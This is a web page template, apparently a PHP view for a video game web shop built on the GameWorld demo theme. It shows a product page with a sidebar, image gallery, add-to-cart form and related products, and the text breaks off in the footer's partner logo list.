
<!doctype html>
<!--[if IE 8 ]>    <html lang="en" class="no-js ie8"> <![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1" />
  <link rel="canonical" href="/" />
  
  <meta name="description" content="" />
  
  <title>GameWorld HTML Template</title>
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,700" rel="stylesheet" type="text/css">
  
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/cs.animate.css" rel="stylesheet" type="text/css" media="all">
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/application.css" rel="stylesheet" type="text/css" media="all">
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/bootstrap.min.3x.css" rel="stylesheet" type="text/css" media="all">
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/cs.bootstrap.3x.css" rel="stylesheet" type="text/css" media="all">
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/owl.carousel.css" rel="stylesheet" type="text/css" media="all">
  <link href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css" rel="stylesheet" type="text/css" media="all">
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/cs.global.css" rel="stylesheet" type="text/css" media="all">
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/cs.style.css" rel="stylesheet" type="text/css" media="all">
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/cs.media.3x.css" rel="stylesheet" type="text/css" media="all">
  <!--[if IE 8 ]> 
  <link href="http://demo.designshopify.com/html_gameworld/assets/stylesheets/ie8.css" rel="stylesheet" type="text/css" media="all">
  <![endif]-->
  
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/jquery-1.8.2.min.js" type="text/javascript"></script>
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/bootstrap.min.3x.js" type="text/javascript"></script>
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/modernizr.js" type="text/javascript"></script>
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/cs.global.js" type="text/javascript"></script>
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/owl.carousel.js" type="text/javascript"></script>
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/jquery.responsive-slider.min.js" type="text/javascript"></script>
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/jquery.imagesloaded.min.js" type="text/javascript"></script>
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/application.js" type="text/javascript"></script>
  <script src="http://demo.designshopify.com/html_gameworld/assets/javascripts/cs.script.js" type="text/javascript"></script>
</head>

<body class="template">
  <!-- Header -->
  <header id="top" class="clearfix">
    <?php include 'v_header.php'; ?>
    <?php include 'v_navig_st.php'; ?>
    <?php include 'v_navig_nd.php'; ?>
  </header>
  
  <div id="content-wrapper-parent">
    <div id="content-wrapper">
      <div id="content" class="container clearfix">
        <div class="group_breadcrumb">
          <div id="breadcrumb" class="row breadcrumb">
            <div class="col-md-24">
              <a href="http://demo.designshopify.com/html_gameworld/index.html" class="homepage-link" title="Back to the frontpage">Home</a>
              <i class="angle-right">&gt;</i>
              <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="">XBOX 360</a>
              <i class="angle-right">&gt;</i>
              <span class="page-title">Curabitur mattis tellus rutrum enim facilisis</span>
            </div>
          </div>
        </div>
        <section class="row content">
          
          <!--sidebar-->
          <div class="col-md-5 sidebar hidden-xs">
            <div class="sb-wrapper">
              <div class="sb-title box featured_game">Featured Games</div>
              <ul class="featured-products sb-content list-unstyled list-styled">
                <li>
                  <div class="row">
                    <div class="col-md-8 row-left unpadding-right">
                      <a href="http://demo.designshopify.com/html_gameworld/product.html" class="product-link">
                        <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_01_small.jpg" class="image-fly img-responsive" alt="Cras in nunc non ipsum duo  cursus ultrices">
                      </a>
                    </div>
                    <div class="col-md-16 row-right parent-fly">
                      <div class="product-wrapper">
                        <div class="fprod-title">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html">Cras in nunc non ipsum duo cursus ultrices</a>
                        </div>
                        <a class="col-title" href="http://demo.designshopify.com/html_gameworld/collection.html">
                          XBOX 360
                        </a>
                        <div class="product-price">
                          <span class="price">
                            <span class="money">€59.00</span>
                          </span>
                        </div>
                        <div class="clearfix">
                          <form action="/cart/add" method="post" enctype="multipart/form-data">
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455695565">martial - €59.00</option>
                                <option value="502624265">animation - €65.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="submit" name="add">Add to Cart</button>
                          </form>
                        </div>
                      </div>
                    </div>
                  </div>
                </li>
                <li>
                  <div class="row">
                    <div class="col-md-8 row-left unpadding-right">
                      <a href="http://demo.designshopify.com/html_gameworld/product.html" class="product-link">
                        <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_02_small.jpg" class="image-fly img-responsive" alt="Curabitur mattis tellus rutrum enim facilisis">
                      </a>
                    </div>
                    <div class="col-md-16 row-right parent-fly">
                      <div class="product-wrapper">
                        <div class="fprod-title">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html">Curabitur mattis tellus rutrum enim facilisis</a>
                        </div>
                        <a class="col-title" href="http://demo.designshopify.com/html_gameworld/collection.html">
                          XBOX 360
                        </a>
                        <div class="product-price">
                          <del class="price_compare"> <span class="money">€69.00</span></del>
                          <span class="price_sale"><span class="money">€59.00</span></span>
                        </div>
                        <div class="clearfix">
                          <form action="/cart/add" method="post" enctype="multipart/form-data">
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455695609">Ferrari / Modern - €59.00</option>
                                <option value="502625841">Lamborghini / Modern - €70.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="submit" name="add">Add to Cart</button>
                          </form>
                        </div>
                      </div>
                    </div>
                  </div>
                </li>
                <li>
                  <div class="row">
                    <div class="col-md-8 row-left unpadding-right">
                      <a href="http://demo.designshopify.com/html_gameworld/product.html" class="product-link">
                        <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_03_small.jpg" class="image-fly img-responsive" alt="Curabitur sollicitudin">
                      </a>
                    </div>
                    <div class="col-md-16 row-right parent-fly">
                      <div class="product-wrapper">
                        <div class="fprod-title">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html">Curabitur sollicitudin</a>
                        </div>
                        <a class="col-title" href="http://demo.designshopify.com/html_gameworld/collection.html">
                          XBOX 360
                        </a>
                        <div class="product-price">
                          <span class="price">
                            <span class="money">€59.00</span>
                          </span>
                        </div>
                        <div class="clearfix">
                          <form action="/cart/add" method="post" enctype="multipart/form-data">
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455695597">animation - €59.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="submit" name="add">Add to Cart</button>
                          </form>
                        </div>
                      </div>
                    </div>
                  </div>
                </li>
              </ul>
            </div>
            <div class="sb-wrapper">
              <div class="sb-title box text_widget">Welcome</div>
              <ul class="list-unstyled sb-content textwidget list-styled">
                <li><p>Maecenas vitae urna in arcu pla vulputate ut eu dui. Fusce quisst neque vulputate, viverra orci vel, accumsan lorem. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris sit amet felis sed tellus</p></li>
              </ul>
            </div>
            <div class="sb-wrapper">
              <div class="sb-title box">Product Vendors</div>
              <ul class="list-unstyled sb-content list-styled">
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Vendor 1">Vendor 1</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Vendor 2">Vendor 2</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Vendor 3">Vendor 3</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Vendor 4">Vendor 4</a>
                </li>
              </ul>
            </div>
            <div class="sb-wrapper">
              <div class="sb-title box">Product Types</div>
              <ul class="list-unstyled sb-content list-styled">
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="CD Key">CD Key</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Digital Copy">Digital Copy</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Game Box">Game Box</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Powerleveling Services">Powerleveling Services</a>
                </li>
              </ul>
            </div>
            <div class="sb-wrapper">
              <div class="sb-title box">Product Categories</div>
              <ul class="list-unstyled sb-content list-styled">
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html">3DS</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html">Gears and Gadgets</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html">PC</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html">PlayStation 3</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html">PSP</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html">Wii</a>
                </li>
                <li>
                  <a href="http://demo.designshopify.com/html_gameworld/collection.html">XBOX 360</a>
                </li>
              </ul>
            </div>
          </div>
          <!--end sidebar-->
          
          <!--col-main-->
          <div id="col-main" class="product-page col-content col-md-19">
            <div itemscope="" itemtype="http://schema.org/Product">
              <meta itemprop="url" content="/products/curabitur-mattis-tellus-rutrum-enim-facilisis">
              <div id="product" class="content row clearfix">
                <div id="product-image" class="col-md-12 product-image">
                  <div class="product-image-wrapper">
                    <a target="_blank" href="<?php echo base_url('assets/img/product/'.$op->img1); ?>" class="main-image elevatezoom">
                      <img itemprop="image" class="img-zoom img-responsive image-fly" src="<?php echo base_url('assets/img/product/'.$op->img1); ?>" data-zoom-image="<?php echo base_url('assets/img/product/'.$op->img1); ?>" alt="Curabitur mattis tellus rutrum enim facilisis">
                      <span class="main-image-bg"></span>
                    </a>
                    <div id="gallery_main" class="product-image-thumb">
                      <a target="_blank" class="image-thumb active" data-image="<?php echo base_url('assets/img/product/'.$op->img2); ?>" data-zoom-image="<?php echo base_url('assets/img/product/'.$op->img2); ?>" href="<?php echo base_url('assets/img/product/'.$op->img2); ?>">
                        <img src="<?php echo base_url('assets/img/product/'.$op->img2); ?>" alt="Curabitur mattis tellus rutrum enim facilisis">
                      </a>
                      <a target="_blank" class="image-thumb" data-image="<?php echo base_url('assets/img/product/'.$op->img3); ?>" data-zoom-image="<?php echo base_url('assets/img/product/'.$op->img3); ?>" href="<?php echo base_url('assets/img/product/'.$op->img3); ?>">
                        <img src="<?php echo base_url('assets/img/product/'.$op->img3); ?>" alt="Curabitur mattis tellus rutrum enim facilisis">
                      </a> 
                      <!-- <a target="_blank" class="image-thumb" data-image="http://demo.designshopify.com/html_gameworld/screen/products/product_07_grande.jpg" data-zoom-image="http://demo.designshopify.com/html_gameworld/screen/products/product_07_1024x1024.jpg" href="http://demo.designshopify.com/html_gameworld/screen/products/product_07_1024x1024.jpg">
                        <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_07_small.jpg" alt="Curabitur mattis tellus rutrum enim facilisis">
                      </a> -->
                    </div>
                  </div>
                </div>
                <div id="product-information" class="col-md-12 product-information">
                  <div id="product-header" class="clearfix">
                    <h3 id="page-product-title" itemprop="name">
                      <?php echo $op->nama_produk; ?>
                    </h3>
                    <div class="description" itemprop="description">
                      <p><?php echo $op->deskripsi; ?></p>
                    </div>
                    <div class="sharing">
                      <div class="addthis_toolbox addthis_default_style">
                        <a class="addthis_button_email"></a>
                        <a class="addthis_button_print"></a>
                        <a class="addthis_button_facebook"></a>
                        <a class="addthis_button_twitter"></a>
                        <a class="addthis_button_pinterest_share"></a>
                        <a class="addthis_button_compact"></a>
                        <a class="addthis_counter addthis_bubble_style"></a>
                      </div>
                      <script type="text/javascript" src="http://s7.addthis.com/js/300/addthis_widget.js#pubid=xa-526dd1ed7110a16a"></script>
                    </div>
                    <div class="relative">
                      <ul class="list-unstyled">
                        <li class="vendor">
                          <span>Vendor:</span>
                          <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Vendor 2">Vendor 2</a>
                        </li>
                        <li class="type">
                          <span>Type:</span>
                          <a href="http://demo.designshopify.com/html_gameworld/collection.html" title="Digital Copy">Digital Copy</a>
                        </li>
                        <li class="tags">
                          <span>Tag:</span>
                          <a href="http://demo.designshopify.com/html_gameworld/collection.html">
                            need-for-speed<span>,</span>
                          </a>
                          <a href="http://demo.designshopify.com/html_gameworld/collection.html">
                            racing
                          </a>
                        </li>
                      </ul>
                    </div>
                    <div itemprop="offers" itemscope="" itemtype="http://schema.org/Offer">
                      <meta itemprop="priceCurrency" content="EUR">
                      <link itemprop="availability" href="http://schema.org/InStock">
                      <form action="<?php echo site_url(); ?>cart/tambah" method="post" enctype="multipart/form-data" accept-charset="utf-8" class="variants" id="product-actions">
                        <div id="product-actions-200046165" class="options clearfix">
                          <div id="purchase-200046165">
                            <div class="detail-price" itemprop="price">
                              <span class="price_sale"><span class="money">€<?php echo $op->harga; ?></span></span>
                              <del class="price_compare"><span class="money">€69.00</span></del>
                            </div>
                          </div>
                          <div class="variants-wrapper clearfix">
                            <div class="selector-wrapper clearfix">
                              <label for="product-select-200046165-option-0">Retailer</label>
                              <div class="wrapper">
                                <select class="single-option-selector col-md-12" id="product-select-200046165-option-0" style="z-index:1000;position:absolute;opacity:0;font-size:11px">
                                  <option value="Ferrari">Ferrari</option>
                                  <option value="Lamborghini">Lamborghini</option>
                                </select>
                                <button type="button" class="custom-style-select-box btn-block changed">
                                  <span class="custom-style-select-box-inner">Ferrari</span>
                                </button>
                                <i class="fa fa-caret-up"></i>
                                <i class="fa fa-caret-down"></i>
                              </div>
                            </div>
                            <div class="selector-wrapper clearfix">
                              <label for="product-select-200046165-option-1">Style</label>
                              <div class="wrapper">
                                <select class="single-option-selector col-md-12" id="product-select-200046165-option-1" style="z-index:1000;position:absolute;opacity:0;font-size:11px">
                                  <option value="Modern">Modern</option>
                                </select>
                                <button type="button" class="custom-style-select-box btn-block changed">
                                  <span class="custom-style-select-box-inner">Modern</span>
                                </button>
                                <i class="fa fa-caret-up"></i>
                                <i class="fa fa-caret-down"></i>
                              </div>
                            </div>
                            <select id="product-select-200046165" name="id" style="display:none">
                              <option value="455695609">Ferrari / Modern - €59.00</option>
                              <option value="502625841">Lamborghini / Modern - €70.00</option>
                            </select>
                          </div>
                          <div class="quantity-wrapper clearfix">
                            <label class="wrapper-title">Qty</label>
                            <div class="wrapper pos-relative">
                              <input id="quantity" type="text" name="qty" value="1" maxlength="5" size="5" class="btn-block item-quantity">
                              <span class="qty-group">
                                <span class="qty-wrapper">
                                  <span class="qty-up btooltip" data-toggle="tooltip" data-placement="top" title="" data-src="#quantity" data-original-title="Increase">
                                    <i class="fa fa-plus"></i>
                                  </span>
                                  <span class="qty-down btooltip" data-toggle="tooltip" data-placement="top" title="" data-src="#quantity" data-original-title="Decrease">
                                    <i class="fa fa-minus"></i>
                                  </span>
                                </span>
                              </span>
                            </div>
                          </div>
                          <input type="hidden" name="id" value="<?php echo $op->id_produk; ?>" />
                          <input type="hidden" name="nama" value="<?php echo $op->nama_produk; ?>" />
                          <input type="hidden" name="harga" value="<?php echo $op->harga; ?>" />
                          <input type="hidden" name="gambar" value="<?php echo $op->img1; ?>" />
                          <div class="others-bottom">
                            <button id="add-to-cart" class="btn" data-parent=".product-information" type="submit" name="add">Add to Cart</button>
                          </div>
                          <div class="control-navigation">
                            <a class="btn btn-prev" href="#">Prev Product</a>
                            <a class="btn btn-next" href="#">Next Product</a>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            <section class="rel-container clearfix">
              <div class="sb-title">
                <h4 class="content-title">Related Products</h4>
              </div>
              <div id="prod-related-wrapper">
                <div id="prod-related" class="clearfix">
                  <div class="element not-animated" data-animate="bounceIn" data-delay="0">
                    <form action="/cart/add" method="post" enctype="multipart/form-data">
                      <ul class="row-container list-unstyled clearfix">
                        <li class="row-left">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html" class="hoverBorder">
                            <span class="hoverBorderWrapper">
                              <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_02_large.jpg" class="image-fly img-responsive" alt="Cras in nunc non ipsum duo  cursus ultrices">
                            </span>
                            <div class="product-ajax-cart hidden-phone">
                              <span class="overlay_mask"></span>
                              <div data-href="http://demo.designshopify.com/html_gameworld/ajax/_product-qs.html" data-target="#quick-shop-modal" class="btn btn-3 quick_shop" data-toggle="modal">
                                Quickshop
                              </div>
                            </div>
                          </a>
                        </li>
                        <li class="row-right text-left parent-fly animMix">
                          <div class="group_info">
                            <a class="title-5" href="http://demo.designshopify.com/html_gameworld/product.html">Cras in nunc non ipsum duo cursus ultrices</a>
                            <br>
                            <a class="col-title" href="http://demo.designshopify.com/html_gameworld/collection.html">
                              XBOX 360
                            </a>
                            <p class="hidden-list">
                              Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius...
                            </p>
                            <div class="product-price">
                              <span class="price">
                                <span class="money">€59.00</span>
                              </span>
                            </div>
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455695565">martial - €59.00</option>
                                <option value="502624265">animation - €65.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="button" name="add">Add to Cart</button>
                          </div>
                        </li>
                      </ul>
                    </form>
                  </div>
                  <div class="element not-animated" data-animate="bounceIn" data-delay="400">
                    <form action="/cart/add" method="post" enctype="multipart/form-data">
                      <ul class="row-container list-unstyled clearfix">
                        <li class="row-left">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html" class="hoverBorder">
                            <span class="hoverBorderWrapper">
                              <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_08_large.jpg" class="image-fly img-responsive" alt="Curabitur sollicitudin">
                            </span>
                            <div class="product-ajax-cart hidden-phone">
                              <span class="overlay_mask"></span>
                              <div data-href="http://demo.designshopify.com/html_gameworld/ajax/_product-qs.html" data-target="#quick-shop-modal" class="btn btn-3 quick_shop" data-toggle="modal">
                                Quickshop
                              </div>
                            </div>
                          </a>
                        </li>
                        <li class="row-right text-left parent-fly animMix">
                          <div class="group_info">
                            <a class="title-5" href="http://demo.designshopify.com/html_gameworld/product.html">Curabitur sollicitudin</a>
                            <br>
                            <a class="col-title" href="http://demo.designshopify.com/html_gameworld/collection.html">
                              XBOX 360
                            </a>
                            <p class="hidden-list">
                              Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius...
                            </p>
                            <div class="product-price">
                              <span class="price">
                                <span class="money">€59.00</span>
                              </span>
                            </div>
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455695597">animation - €59.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="button" name="add">Add to Cart</button>
                          </div>
                        </li>
                      </ul>
                    </form>
                  </div>
                  <div class="element not-animated" data-animate="bounceIn" data-delay="600">
                    <form action="/cart/add" method="post" enctype="multipart/form-data">
                      <ul class="row-container list-unstyled clearfix">
                        <li class="row-left">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html" class="hoverBorder">
                            <span class="hoverBorderWrapper">
                              <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_07_large.jpg" class="image-fly img-responsive" alt="Nam at lectus eget mi vista  hendrerit tincidunt">
                            </span>
                            <div class="product-ajax-cart hidden-phone">
                              <span class="overlay_mask"></span>
                              <div data-href="http://demo.designshopify.com/html_gameworld/ajax/_product-qs.html" data-target="#quick-shop-modal" class="btn btn-3 quick_shop" data-toggle="modal">
                                Quickshop
                              </div>
                            </div>
                          </a>
                        </li>
                        <li class="row-right text-left parent-fly animMix">
                          <div class="group_info">
                            <a class="title-5" href="http://demo.designshopify.com/html_gameworld/product.html">Nam at lectus eget mi vista hendrerit tincidunt</a>
                            <br>
                            <a class="col-title" href="http://demo.designshopify.com/html_gameworld/collection.html">
                              XBOX 360
                            </a>
                            <p class="hidden-list">
                              Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius...
                            </p>
                            <div class="product-price">
                              <span class="price">
                                <span class="money">€59.00</span>
                              </span>
                            </div>
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455695573">action - €59.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="button" name="add">Add to Cart</button>
                          </div>
                        </li>
                      </ul>
                    </form>
                  </div>
                  <div class="element not-animated" data-animate="bounceIn" data-delay="800">
                    <form action="/cart/add" method="post" enctype="multipart/form-data">
                      <ul class="row-container list-unstyled clearfix">
                        <li class="row-left">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html" class="hoverBorder">
                            <span class="hoverBorderWrapper">
                              <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_04_large.jpg" class="image-fly img-responsive" alt="Pellentesque habitant morbi  tristique senectus">
                            </span>
                            <div class="product-ajax-cart hidden-phone">
                              <span class="overlay_mask"></span>
                              <div data-href="http://demo.designshopify.com/html_gameworld/ajax/_product-qs.html" data-target="#quick-shop-modal" class="btn btn-3 quick_shop" data-toggle="modal">
                                Quickshop
                              </div>
                            </div>
                          </a>
                        </li>
                        <li class="row-right text-left parent-fly animMix">
                          <div class="group_info">
                            <a class="title-5" href="http://demo.designshopify.com/html_gameworld/product.html">Pellentesque habitant morbi tristique senectus</a>
                            <br>
                            <a class="col-title" href="http://demo.designshopify.com/html_gameworld/collection.html">
                              XBOX 360
                            </a>
                            <p class="hidden-list">
                              Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius...
                            </p>
                            <div class="product-price">
                              <span class="price">
                                <span class="money">€59.00</span>
                              </span>
                            </div>
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455695585">action - €59.00</option>
                                <option value="502628309">horror - €65.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="button" name="add">Add to Cart</button>
                          </div>
                        </li>
                      </ul>
                    </form>
                  </div>
                  <div class="element not-animated" data-animate="bounceIn" data-delay="1000">
                    <form action="/cart/add" method="post" enctype="multipart/form-data">
                      <ul class="row-container list-unstyled clearfix">
                        <li class="row-left">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html" class="hoverBorder">
                            <span class="hoverBorderWrapper">
                              <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_06_large.jpg" class="image-fly img-responsive" alt="Suspendisse sed libero consequat">
                            </span>
                            <div class="product-ajax-cart hidden-phone">
                              <span class="overlay_mask"></span>
                              <div data-href="http://demo.designshopify.com/html_gameworld/ajax/_product-qs.html" data-target="#quick-shop-modal" class="btn btn-3 quick_shop" data-toggle="modal">
                                Quickshop
                              </div>
                            </div>
                          </a>
                        </li>
                        <li class="row-right text-left parent-fly animMix">
                          <div class="group_info">
                            <a class="title-5" href="http://demo.designshopify.com/html_gameworld/product.html">Suspendisse sed libero consequat</a>
                            <br>
                            <a class="col-title" href="/collection.html">
                              XBOX 360
                            </a>
                            <p class="hidden-list">
                              Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius...
                            </p>
                            <div class="product-price">
                              <span class="price">
                                <span class="money">€59.00</span>
                              </span>
                            </div>
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455709309">animation - €59.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="button" name="add">Add to Cart</button>
                          </div>
                        </li>
                      </ul>
                    </form>
                  </div>
                  <div class="element not-animated" data-animate="bounceIn" data-delay="1200">
                    <form action="/cart/add" method="post" enctype="multipart/form-data">
                      <ul class="row-container list-unstyled clearfix">
                        <li class="row-left">
                          <a href="http://demo.designshopify.com/html_gameworld/product.html" class="hoverBorder">
                            <span class="hoverBorderWrapper">
                              <img src="http://demo.designshopify.com/html_gameworld/screen/products/product_05_large.jpg" class="image-fly img-responsive" alt="Suspendisse sed libero consequat">
                            </span>
                            <div class="product-ajax-cart hidden-phone">
                              <span class="overlay_mask"></span>
                              <div data-href="http://demo.designshopify.com/html_gameworld/ajax/_product-qs.html" data-target="#quick-shop-modal" class="btn btn-3 quick_shop" data-toggle="modal">
                                Quickshop
                              </div>
                            </div>
                          </a>
                        </li>
                        <li class="row-right text-left parent-fly animMix">
                          <div class="group_info">
                            <a class="title-5" href="http://demo.designshopify.com/html_gameworld/product.html">Suspendisse sed libero consequat</a>
                            <br>
                            <a class="col-title" href="http://demo.designshopify.com/html_gameworld/collection.html">
                              XBOX 360
                            </a>
                            <p class="hidden-list">
                              Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius...
                            </p>
                            <div class="product-price">
                              <span class="price">
                                <span class="money">€59.00</span>
                              </span>
                            </div>
                            <div class="hide clearfix">
                              <select name="id">
                                <option selected="selected" value="455709193">martial - €59.00</option>
                                <option value="502629429">action - €69.00</option>
                              </select>
                            </div>
                            <input type="hidden" name="quantity" value="1">
                            <button class="btn add-to-cart" data-parent=".parent-fly" type="button" name="add">Add to Cart</button>
                          </div>
                        </li>
                      </ul>
                    </form>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <!--end-col-main-->
        </section>
      </div>
    </div>
  </div>
  
  <div id="bottom">
    <div class="container">
      <div id="bottom-content" class="row">
        <div class="clearfix">
          <div id="widget-partners">
            <div class="widget-wrapper text-center">
              <div id="partners-container" class="clearfix">
                <div id="partners" class="clearfix">
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="150">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="300">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="450">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="600">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="750">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="900">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="1050">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
                    </a>
                  </div>
                  <div class="logo not-animated text-center" data-animate="bounceIn" data-delay="1200">
                    <a class="animated" href="http://demo.designshopify.com/html_gameworld/collection.html">
                      <img class="pulse" src="http://demo.designshopify.com/html_gameworld/screen/others/partners_logo.png" alt="">
